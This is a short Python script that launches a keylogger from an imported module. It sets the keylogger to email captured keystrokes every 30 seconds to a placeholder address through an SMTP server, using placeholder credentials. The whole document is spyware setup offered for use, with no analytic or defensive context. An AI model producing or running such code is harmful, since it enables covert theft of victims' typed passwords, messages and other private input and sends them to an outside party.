import keylogger

my_keylogger = keylogger.Keylogger(time_interval= 30, email= "your-email@example.com", password= "example123", server= "smtp-mail.example.com", port=587)
my_keylogger.start()
